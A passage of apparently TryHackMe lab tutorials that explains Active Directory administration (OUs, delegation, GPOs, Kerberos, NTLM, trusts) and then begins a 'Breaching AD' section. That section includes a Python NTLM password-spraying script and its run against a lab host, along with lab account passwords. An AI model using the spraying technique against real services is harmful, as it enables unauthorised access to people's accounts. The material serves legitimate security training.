![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/15b282b6e3940f4c26c477a8c21f8266.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/15b282b6e3940f4c26c477a8c21f8266.png)

This will show you some additional containers and enable you to
 disable the accidental deletion protection. To do so, right-click the OU and go to Properties. You will find a checkbox in the Object tab to disable the protection:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ad6b6d886c0448d14ce4ec8c62250256.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/ad6b6d886c0448d14ce4ec8c62250256.png)

Be sure to uncheck the box and try deleting the OU
 again. You will be prompted to confirm that you want to delete the OU, 
and as a result, any users, groups or OUs under it will also be deleted.

After deleting the extra OU,
 you should notice that for some of the departments, the users in the AD
 don't match the ones in our organisational chart. Create and delete 
users as needed to match them.

# Delegation

One of the nice things you can do in AD is to give specific users some control over some OUs. This process is known as **delegation** and
 allows you to grant users specific privileges to perform advanced tasks
 on OUs without needing a Domain Administrator to step in.

One of the most common use cases for this is granting `IT support`
 the privileges to reset other low-privilege users' passwords. According
 to our organisational chart, Phillip is in charge of IT support, so 
we'd probably want to delegate the control of resetting passwords over 
the Sales, Marketing and Management OUs to him.

For this example, we will delegate control over the Sales OU to Phillip. To delegate control over an OU, you can right-click it and select **Delegate Control**:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/74f8d615658a03aeb1cfdb6767d0a0a3.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/74f8d615658a03aeb1cfdb6767d0a0a3.png)

This should open a new window where you will first be asked for the users to whom you want to delegate control:

**Note:** To avoid mistyping the user's name, write "phillip" and click the **Check Names** button. Windows will autocomplete the user for you.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2814715e1dbadaef334973028e02da69.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2814715e1dbadaef334973028e02da69.png)

Click OK, and on the next step, select the following option:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3f81df2b38e35ca5729aee7a76c6b220.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/3f81df2b38e35ca5729aee7a76c6b220.png)

Click next a couple of times, and now Phillip should be able to reset
 passwords for any user in the sales department. While you'd probably 
want to repeat these steps to delegate the password resets of the 
Marketing and Management departments, we'll leave it here for this task.
 You are free to continue to configure the rest of the OUs if you so 
desire.

Now let's use Phillip's account to try and reset Sophie's password. Here are Phillip's credentials for you to log in via RDP:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/fb7768e14470fc6b51d6fe2cc991cd6f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/fb7768e14470fc6b51d6fe2cc991cd6f.png)

| **Username** | phillip |
| --- | --- |
| **Password** | Claire2008 |

**Note:** When connecting via RDP, use `THM\phillip` as the username to specify you want to log in using the user `phillip` on the `THM` domain.

While you may be tempted to go to **Active Directory Users and Computers**
 to try and test Phillip's new powers, he doesn't really have the 
privileges to open it, so you'll have to use other methods to do 
password resets. In this case, we will be using Powershell to do so:

Windows PowerShell (As Phillip)

```
PS C:\Users\phillip> Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose

New Password: *********

VERBOSE: Performing the operation "Set-ADAccountPassword" on target "CN=Sophie,OU=Sales,OU=THM,DC=thm,DC=local".
```

Since we wouldn't want Sophie to keep on using a password we know, we
 can also force a password reset at the next logon with the following 
command:

Windows PowerShell (as Phillip)

```
PS C:\Users\phillip> Set-ADUser -ChangePasswordAtLogon $true -Identity sophie -Verbose

VERBOSE: Performing the operation "Set" on target "CN=Sophie,OU=Sales,OU=THM,DC=thm,DC=local".
```

**Managing Computers in AD**

By default, all the machines that join a domain (except for the DCs) will be put in the container called "Computers". If we check our DC, we will see that some devices are already there:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a1d41d5437e73d62ede10f2015dc4dfc.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a1d41d5437e73d62ede10f2015dc4dfc.png)

We can see some servers, some laptops and some PCs corresponding to 
the users in our network. Having all of our devices there is not the 
best idea since it's very likely that you want different policies for 
your servers and the machines that regular users use on a daily basis.

While there is no golden rule on how to organise your machines, an 
excellent starting point is segregating devices according to their use. 
In general, you'd expect to see devices divided into at least the three 
following categories:

**1. Workstations**

Workstations are one of the most common devices within an Active 
Directory domain. Each user in the domain will likely be logging into a 
workstation. This is the device they will use to do their work or normal
 browsing activities. These devices should never have a privileged user 
signed into them.

**2. Servers**

Servers are the second most common device within an Active Directory 
domain. Servers are generally used to provide services to users or other
 servers.

**3. Domain Controllers**

Domain Controllers are the third most common device within an Active 
Directory domain. Domain Controllers allow you to manage the Active 
Directory Domain. These devices are often deemed the most sensitive 
devices within the network as they contain hashed passwords for all user
 accounts within the environment.

Since we are tidying up our AD, let's create two separate OUs for `Workstations` and `Servers` (Domain Controllers are already in an OU created by Windows). We will be creating them directly under the `thm.local` domain container. In the end, you should have the following OU structure:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/09405010962071f21c6dee7b4eb8c59a.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/09405010962071f21c6dee7b4eb8c59a.png)

Now, move the personal computers and laptops to the Workstations OU and the servers to the Servers OU from the Computers container. Doing so will allow us to configure policies for each OU later.

**Group Policies**

So far, we have organised users and computers in OUs
 just for the sake of it, but the main idea behind this is to be able to
 deploy different policies for each OU individually. That way, we can 
push different configurations and security baselines to users depending 
on their department.

Windows manages such policies through **Group Policy Objects (GPO)**.
 GPOs are simply a collection of settings that can be applied to OUs. 
GPOs can contain policies aimed at either users or computers, allowing 
you to set a baseline on specific machines and identities.

To configure GPOs, you can use the **Group Policy Management** tool, available from the start menu:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b19052c41e27fbbb2651038cede63e11.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b19052c41e27fbbb2651038cede63e11.png)

The first thing you will see when opening it is your complete OU hierarchy, as defined before. To configure Group Policies, you first create a GPO under **Group Policy Objects** and then link it to the OU where you want the policies to apply. As an example, you can see there are some already existing GPOs in your machine:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d82cb9440894c831f6f3d58a2b0538ed.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d82cb9440894c831f6f3d58a2b0538ed.png)

We can see in the image above that 3 GPOs have been created. From those, the `Default Domain Policy` and `RDP Policy` are linked to the `thm.local` domain as a whole, and the `Default Domain Controllers Policy` is linked to the `Domain Controllers` OU
 only. Something important to have in mind is that any GPO will apply to
 the linked OU and any sub-OUs under it. For example, the `Sales` OU will still be affected by the `Default Domain Policy`.

Let's examine the `Default Domain Policy` to see what's inside a GPO. The first tab you'll see when selecting a GPO shows its **scope**, which is where the GPO is linked in the AD. For the current policy, we can see that it has only been linked to the `thm.local` domain:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/06d5e70fbfa648f73e4598e18c8e9527.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/06d5e70fbfa648f73e4598e18c8e9527.png)

As you can see, you can also apply **Security Filtering** to GPOs so that they are only applied to specific users/computers under an OU. By default, they will apply to the **Authenticated Users** group, which includes all users/PCs.

The **Settings** tab includes the actual contents of the GPO
 and lets us know what specific configurations it applies. As stated 
before, each GPO has configurations that apply to computers only and 
configurations that apply to users only. In this case, the `Default Domain Policy` only contains Computer Configurations:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c9293853549d5126b77bf2de8086e076.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c9293853549d5126b77bf2de8086e076.png)

Feel free to explore the GPO and expand on the available items using the "show" links on the right side of each configuration. In this case, the `Default Domain Policy` indicates really basic configurations that should apply to most domains, including password and account lockout policies:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a5f4c2605062934579c64f2cfa025308.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/a5f4c2605062934579c64f2cfa025308.png)

Since this GPO
 applies to the whole domain, any change to it would affect all 
computers. Let's change the minimum password length policy to require 
users to have at least 10 characters in their passwords. To do this, 
right-click the GPO and select **Edit**:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b71d8de9e74d129d0ad4142863deadc4.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/b71d8de9e74d129d0ad4142863deadc4.png)

This will open a new window where we can navigate and edit all the 
available configurations. To change the minimum password length, go to `Computer
 Configurations -> Policies -> Windows Setting -> Security 
Settings -> Account Policies -> Password Policy` and change the required policy value:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/bd3665c2569aa8fbe4f7482a5750f018.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/bd3665c2569aa8fbe4f7482a5750f018.png)

As you can see, plenty of policies can be established in a GPO.
 While explaining every single of them would be impossible in a single 
room, do feel free to explore a bit, as some of the policies are 
straightforward. If more information on any of the policies is needed, 
you can double-click them and read the **Explain** tab on each of them:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/de35e7c03fafcb5b9df5457181e32652.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/de35e7c03fafcb5b9df5457181e32652.png)

# GPO

GPOs are distributed to the network via a network share called `SYSVOL`, which is stored in the DC.
 All users in a domain should typically have access to this share over 
the network to sync their GPOs periodically. The SYSVOL share points by 
default to the `C:\Windows\SYSVOL\sysvol\` directory on each of the DCs in our network.

Once a change has been made to any GPOs, it might take up to 2 hours 
for computers to catch up. If you want to force any particular computer 
to sync its GPOs immediately, you can always run the following command 
on the desired computer:

Windows PowerShell

```
PS C:\> gpupdate /force
```

# Creating some GPOs for Inc.

As part of our new job, we have been tasked with implementing some GPOs to allow us to:

1. Block non-IT users from accessing the Control Panel.
2. Make workstations and servers lock their screen automatically after 5 minutes of user inactivity to avoid people leaving their sessions
exposed.

Let's focus on each of those and define what policies we should enable in each GPO and where they should be linked.

***Restrict Access to Control Panel***

We 
want to restrict access to the Control Panel across all machines to only
 the users that are part of the IT department. Users of other 
departments shouldn't be able to change the system's preferences.

Let's create a new GPO called `Restrict Control Panel Access` and open it for editing. Since we want this GPO to apply to specific users, we will look under `User Configuration` for the following policy:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9b333a11d12f05dd4413e3f208aab363.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9b333a11d12f05dd4413e3f208aab363.png)

Notice we have enabled the **Prohibit Access to Control Panel and PC settings** policy.

Once the GPO
 is configured, we will need to link it to all of the OUs corresponding 
to users who shouldn't have access to the Control Panel of their PCs. In
 this case, we will link the `Marketing`, `Management` and `Sales` OUs by dragging the GPO to each of them:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4a8f727788731b7fbf87fc079682d1a6.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/4a8f727788731b7fbf87fc079682d1a6.png)

***Auto Lock Screen GPO***

For the first GPO, regarding screen locking for workstations and servers, we could directly apply it over the `Workstations`, `Servers` and `Domain Controllers` OUs we created previously.

While this solution should work, an alternative consists of simply applying the GPO to the root domain, as we want the GPO to affect all of our computers. Since the `Workstations`, `Servers` and `Domain Controllers` OUs are all child OUs of the root domain, they will inherit its policies.

**Note:** You might notice that if our GPO is applied to the root domain, it will also be inherited by other OUs like `Sales` or `Marketing`. Since these OUs contain users only, any Computer Configuration in our GPO will be ignored by them.

Let's create a new GPO, call it `Auto Lock Screen`, and edit it. The policy to achieve what we want is located in the following route:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/44c0cde18837cb6333c78749356ac0ee.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/44c0cde18837cb6333c78749356ac0ee.png)

We will set the inactivity limit to 5 minutes so that computers
 get locked automatically if any user leaves their session open. After 
closing the GPO editor, we will link the GPO to the root domain by dragging the GPO to it:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/fcfc77d126991ffee8c927202b4dde37.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/fcfc77d126991ffee8c927202b4dde37.png)

Once the GPOs have been applied to the correct OUs, we can log 
in as any users in either Marketing, Sales or Management for 
verification. For this task, let's connect via RDP using Mark's credentials:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/fb7768e14470fc6b51d6fe2cc991cd6f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/fb7768e14470fc6b51d6fe2cc991cd6f.png)

| **Username** | Mark |
| --- | --- |
| **Password** | M4rk3t1ng.21 |

Note: When connecting via RDP, use `THM\Mark` as the username to specify you want to log in using the user `Mark` on the `THM` domain.

If
 we try opening the Control Panel, we should get a message indicating 
this operation is denied by the administrator. You can also wait 5 
minutes to check if the screen is automatically locked if you want.

Since we didn't apply the control panel GPO on IT, you should still be able to log into the machine as any of those users and access the control panel.

**Note:** If you created and linked the GPOs, but for some reason, they still don't work, remember you can run `gpupdate /force` to force GPOs to be updated.

**Authentication Methods**

When using Windows 
domains, all credentials are stored in the Domain Controllers. Whenever a
 user tries to authenticate to a service using domain credentials, the 
service will need to ask the Domain Controller to verify if they are 
correct. Two protocols can be used for network authentication in windows
 domains:

- **Kerberos:** Used by any recent version of Windows. This is the default protocol in any recent domain.
- **NetNTLM:** Legacy authentication protocol kept for compatibility purposes.

While
 NetNTLM should be considered obsolete, most networks will have both 
protocols enabled. Let's take a deeper look at how each of these 
protocols works.

# Kerberos

Kerberos
 authentication is the default authentication protocol for any recent 
version of Windows. Users who log into a service using Kerberos will be 
assigned tickets. Think of tickets as proof of a previous 
authentication. Users with tickets can present them to a service to 
demonstrate they have already authenticated into the network before and 
are therefore enabled to use it.

When Kerberos is used for authentication, the following process happens:

1. The user sends their username and a timestamp encrypted using a key derived from their password to the **Key Distribution Center (KDC)**, a service usually installed on the Domain Controller in charge of creating Kerberos tickets on the network.
    
    The KDC will create and send back a **Ticket Granting Ticket (TGT)**,
     which will allow the user to request additional tickets to access 
    specific services. The need for a ticket to get more tickets may sound a
     bit weird, but it allows users to request service tickets without 
    passing their credentials every time they want to connect to a service. 
    Along with the TGT, a **Session Key** is given to the user, which they will need to generate the following requests.
    
    Notice the TGT is encrypted using the **krbtgt** account's password hash, and therefore the user can't access its contents. It is essential to know that the encrypted TGT
     includes a copy of the Session Key as part of its contents, and the KDC
     has no need to store the Session Key as it can recover a copy by 
    decrypting the TGT if needed.
    

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d36f5a024c20fb480cdae8cd09ddc09f.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d36f5a024c20fb480cdae8cd09ddc09f.png)

1. When a user wants to connect to a service on the network like a share, website or database, they will use their TGT to ask the KDC for a **Ticket Granting Service (TGS)**. TGS are tickets that allow connection only to the specific service they were created for. To request a TGS, the user will send their username
and a timestamp encrypted using the Session Key, along with the TGT and a **Service Principal Name (SPN),** which indicates the service and server name we intend to access.
    
    As a result, the KDC will send us a TGS along with a **Service Session Key**, which we will need to authenticate to the service we want to access. The TGS is encrypted using a key derived from the **Service Owner Hash**.
     The Service Owner is the user or machine account that the service runs 
    under. The TGS contains a copy of the Service Session Key on its 
    encrypted contents so that the Service Owner can access it by decrypting
     the TGS.
    

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/84504666e78373c613d3e05d176282dc.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/84504666e78373c613d3e05d176282dc.png)

1. The TGS can then be sent to the desired service to authenticate and
establish a connection. The service will use its configured account's
password hash to decrypt the TGS and validate the Service Session Key.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8fbf08d03459c1b792f3b6efa4d7f285.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/8fbf08d03459c1b792f3b6efa4d7f285.png)

# NetNTLM Authentication

NetNTLM works using a challenge-response mechanism. The entire process is as follows:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2eab5cacbd0d3e9dc9afb86169b711ec.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2eab5cacbd0d3e9dc9afb86169b711ec.png)

1. The client sends an authentication request to the server they want to access.
2. The server generates a random number and sends it as a challenge to the client.
3. The client combines their NTLM password hash with the challenge (and other known data) to generate a
response to the challenge and sends it back to the server for
verification.
4. The server forwards the challenge and the response to the Domain Controller for verification.
5. The domain controller uses the challenge to recalculate the response and compares it to the original response sent by the client. If they
both match, the client is authenticated; otherwise, access is denied.
The authentication result is sent back to the server.
6. The server forwards the authentication result to the client.

**Trees, Forests and Trusts**

So far, we have 
discussed how to manage a single domain, the role of a Domain Controller
 and how it joins computers, servers and users.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/69f2441bbafd4cfe57a101d87f3c5950.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/69f2441bbafd4cfe57a101d87f3c5950.png)

As companies grow, so do their networks. Having a single domain for a
 company is good enough to start, but in time some additional needs 
might push you into having more than one.

# Trees

Imagine, for example, that suddenly your company expands to a 
new country. The new country has different laws and regulations that 
require you to update your GPOs to comply. In addition, you now have IT 
people in both countries, and each IT team needs to manage the resources
 that correspond to each country without interfering with the other 
team. While you could create a complex OU structure and use delegations to achieve this, having a huge AD structure might be hard to manage and prone to human errors.

Luckily for us, Active Directory supports integrating multiple 
domains so that you can partition your network into units that can be 
managed independently. If you have two domains that share the same 
namespace (`thm.local` in our example), those domains can be joined into a **Tree**.

If our `thm.local` domain was split into two subdomains for UK and US branches, you could build a tree with a root domain of `thm.local` and two subdomains called `uk.thm.local` and `us.thm.local`, each with its AD, computers and users:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/abea24b7979676a1dcc0c568054544c8.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/abea24b7979676a1dcc0c568054544c8.png)

This partitioned structure gives us better control over who can
 access what in the domain. The IT people from the UK will have their 
own DC
 that manages the UK resources only. For example, a UK user would not be
 able to manage US users. In that way, the Domain Administrators of each
 branch will have complete control over their respective DCs, but not 
other branches' DCs. Policies can also be configured independently for 
each domain in the tree.

A new security group needs to be introduced when talking about trees and forests. The **Enterprise Admins**
 group will grant a user administrative privileges over all of an 
enterprise's domains. Each domain would still have its Domain Admins 
with administrator privileges over their single domains and the 
Enterprise Admins who can control everything in the enterprise.

# Forests

The domains you manage can also be configured in different 
namespaces. Suppose your company continues growing and eventually 
acquires another company called `MHT Inc.` When both 
companies merge, you will probably have different domain trees for each 
company, each managed by its own IT department. The union of several 
trees with different namespaces into the same network is known as a **forest**.

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/03448c2faf976db890118d835000bab7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/03448c2faf976db890118d835000bab7.png)

# Trust Relationships

Having multiple domains organised in trees and forest allows 
you to have a nice compartmentalised network in terms of management and 
resources. But at a certain point, a user at THM
 UK might need to access a shared file in one of MHT ASIA servers. For 
this to happen, domains arranged in trees and forests are joined 
together by **trust relationships**.

In simple terms, having a trust relationship between domains allows you to authorise a user from domain `THM UK` to access resources from domain `MHT EU`.

The simplest trust relationship that can be established is a **one-way trust relationship**. In a one-way trust, if `Domain AAA` trusts `Domain BBB`, this means that a user on BBB can be authorised to access resources on AAA:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/af95eb1a4b6c672491d8989f79c00200.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/af95eb1a4b6c672491d8989f79c00200.png)

The direction of the one-way trust relationship is contrary to that of the access direction.

**Two-way trust relationships** can also be made to 
allow both domains to mutually authorise users from the other. By 
default, joining several domains under a tree or a forest will form a 
two-way trust relationship.

It is important to note that having a trust relationship between 
domains doesn't automatically grant access to all resources on other 
domains. Once a trust relationship is established, you have the chance 
to authorise users across different domains, but it's up to you what is 
actually authorised or not.

**BREACHING ACTIVE DIRECTORY**

**OSINT and Phishing**

Two popular methods for gaining access to that first set of AD
 credentials is Open Source Intelligence (OSINT) and Phishing. We will 
only briefly mention the two methods here, as they are already covered 
more in-depth in other rooms.

**OSINT**

OSINT

is used to discover inf

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/aff4d16d5f4905d8e323c76397ed78fe.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/aff4d16d5f4905d8e323c76397ed78fe.png)

ormation that has been publicly disclosed. In terms of

AD

credentials, this can happen for several reasons, such as:

- Users who ask questions on public forums such as [Stack Overflow](https://stackoverflow.com/) but disclose sensitive information such as their credentials in the question.
- Developers that upload scripts to services such as [Github](https://github.com/) with credentials hardcoded.
- Credentials being disclosed in past breaches since employees used their work
accounts to sign up for other external websites. Websites such as [HaveIBeenPwned](https://haveibeenpwned.com/) and [DeHashed](https://www.dehashed.com/) provide excellent platforms to determine if someone's information, such as work email, was ever involved in a publicly known data breach.

By using OSINT
 techniques, it may be possible to recover publicly disclosed 
credentials. If we are lucky enough to find credentials, we will still 
need to find a way to test whether they are valid or not since OSINT 
information can be outdated. In Task 3, we will talk about NTLM 
Authenticated Services, which may provide an excellent avenue to test 
credentials to see if they are still valid.

A detailed room on Red Team OSINT can be found [here.](https://tryhackme.com/jr/redteamrecon)

**Phishing**

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/8aaed661dc298a6ee9257e1edbd0df97.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/8aaed661dc298a6ee9257e1edbd0df97.png)

Phishing

is another excellent method to breach AD. Phishing usually entices 
users to either provide their credentials on a malicious web page or ask
 them to run a specific application that would install a Remote Access 
Trojan (RAT) in the background. This is a prevalent method since the RAT
 would execute in the user's context, immediately allowing you to 
impersonate that user's AD account. This is why phishing is such a big 
topic for both Red and Blue teams.

A detailed room on phishing can be found [here.](https://tryhackme.com/module/phishing)

**NTLM Authenticated Services**

# NTLM

New Technology LAN Manager (NTLM)
 is the suite of security protocols used to authenticate users' 
identities in AD. NTLM can be used for authentication by using a 
challenge-response-based scheme called NetNTLM. This authentication 
mechanism is heavily used by the services on a network. However, 
services that use NetNTLM can also be exposed to the internet. The 
following are some of the popular examples:

- Internally-hosted Exchange (Mail) servers that expose an Outlook Web App (OWA) login portal.
- Remote Desktop Protocol (RDP) service of a server being exposed to the internet.
- Exposed VPN endpoints that were integrated with AD.
- Web applications that are internet-facing and make use of NetNTLM.

NetNTLM,
 also often referred to as Windows Authentication or just NTLM 
Authentication, allows the application to play the role of a middle man 
between the client and AD. All authentication material is forwarded to a
 Domain Controller in the form of a challenge, and if completed 
successfully, the application will authenticate the user.

This
 means that the application is authenticating on behalf of the user and 
not authenticating the user directly on the application itself. This 
prevents the application from storing AD credentials, which should only be stored on a Domain Controller. This process is shown in the diagram below:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c9113ad0ff443dd0973736552e85aa69.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/c9113ad0ff443dd0973736552e85aa69.png)

# Brute-force Login Attacks

As
 mentioned in Task 2, these exposed services provide an excellent 
location to test credentials discovered using other means. However, 
these services can also be used directly in an attempt to recover an 
initial set of valid AD
 credentials. We could perhaps try to use these for brute force attacks 
if we recovered information such as valid email addresses during our 
initial red team recon.

Since most AD
 environments have account lockout configured, we won't be able to run a
 full brute-force attack. Instead, we need to perform a password 
spraying attack. Instead of trying multiple different passwords, which 
may trigger the account lockout mechanism, we choose and use one 
password and attempt to authenticate with all the usernames we have 
acquired. However, it should be noted that these types of attacks can be
 detected due to the amount of failed authentication attempts they will 
generate.

You have been provided with a list of usernames discovered during a red team OSINT
 exercise. The OSINT exercise also indicated the organisation's initial 
onboarding password, which seems to be "Changeme123". Although users 
should always change their initial password, we know that users often 
forget. We will be using a custom-developed script to stage a password 
spraying against the web application hosted at this URL: [http://ntlmauth.za.tryhackme.com](http://ntlmauth.za.tryhackme.com/).

Navigating to the URL, we can see that it prompts us for Windows Authentication credentials:

![https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/5f18e5326d5a50d656d1827221bdcac7.png](https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/5f18e5326d5a50d656d1827221bdcac7.png)

**Note:** *Firefox's
 Windows Authentication plugin is incredibly prone to failure. If you 
want to test credentials manually, Chrome is recommended.*

We could use tools such as [Hydra](https://github.com/vanhauser-thc/thc-hydra)
 to assist with the password spraying attack. However, it is often 
better to script up these types of attacks yourself, which allows you 
more control over the process. A base python script has been provided in
 the task files that can be used for the password spraying attack. The 
following function is the main component of the script:

```python
def password_spray(self, password, url):
    print ("[*] Starting passwords spray attack using the following password: " + password)
    #Reset valid credential counter
    count = 0
    #Iterate through all of the possible usernames
    for user in self.users:
        #Make a request to the website and attempt Windows Authentication
        response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
        #Read status code of response to determine if authentication was successful
        if (response.status_code == self.HTTP_AUTH_SUCCEED_CODE):
            print ("[+] Valid credential pair found! Username: " + user + " Password: " + password)
            count += 1
            continue
        if (self.verbose):
            if (response.status_code == self.HTTP_AUTH_FAILED_CODE):
                print ("[-] Failed login with Username: " + user)
    print ("[*] Password spray attack completed, " + str(count) + " valid credential pairs found")
```

This
 function takes our suggested password and the URL that we are targeting
 as input and attempts to authenticate to the URL with each username in 
the textfile. By monitoring the differences in HTTP
 response codes from the application, we can determine if the credential
 pair is valid or not. If the credential pair is valid, the application 
would respond with a 200 HTTP (OK) code. If the pair is invalid, the 
application will return a 401 HTTP (Unauthorised) code.

# Password Spraying

If you are using the AttackBox, the password spraying script and usernames textfile is provided under the `/root/Rooms/BreachingAD/task3/` directory. We can run the script using the following command:

```
python ntlm_passwordspray.py -u <userfile> -f <fqdn> -p <password> -a <attackurl>
```

We provide the following values for each of the parameters:

- **<userfile>** - Textfile containing our usernames - *"usernames.txt"*
- **<fqdn>** - Fully qualified domain name associated with the organisation that we are attacking - *"za.tryhackme.com"*
- **<password>** - The password we want to use for our spraying attack - *"Changeme123"*
- **<attackurl>** - The URL of the application that supports Windows Authentication - *"http://ntlmauth.za.tryhackme.com"*

Using these parameters, we should get a few valid credentials pairs from our password spraying attack.

NTLM Password Spraying Attack

```
[thm@thm]$ python ntlm_passwordspray.py -u usernames.txt -f za.tryhackme.com -p Changeme123 -a http://ntlmauth.za.tryhackme.com/[*] Starting passwords spray attack using the following password: Changeme123
[-] Failed login with Username: anthony.reynolds
[-] Failed login with Username: henry.taylor
[...]
[+] Valid credential pair found! Username: [...] Password: Changeme123
[-] Failed login with Username: louise.talbot
[...]
[*] Password spray attack completed, [X] valid credential pairs found
```

Using a combination of OSINT and NetNTLM password spraying, we now have our first valid credentials pairs that could be used to enumerate AD further!

**LDAP Bind Credentials**

# LDAP

Another method of AD
 authentication that applications can use is Lightweight Directory 
Access Protocol (LDAP) authentication. LDAP authentication is similar to
 NTLM authentication. However, with LDAP authentication, the application
 directly verifies the user's credentials. The application has a pair of
 AD credentials that it can use first to query LDAP and then verify the 
AD user's credentials.

LDAP authentication is a popular mechanism with third-party (non-Microsoft) applications that integrate with AD. These include applications and systems such as:

- Gitlab
- Jenkins
- Custom-developed web applications
- Printers
- VPNs

If any of these applications or services are exposed on the internet, the same type of attacks as those leveraged against NTLM
 authenticated systems can be used. However, since a service using LDAP 
authentication requires a set of AD credentials, it opens up additional 
attack avenues. In essence, we can attempt to recover the AD credentials
 used by the service to gain authenticated access to AD. The process of 
authentication through LDAP is shown below:

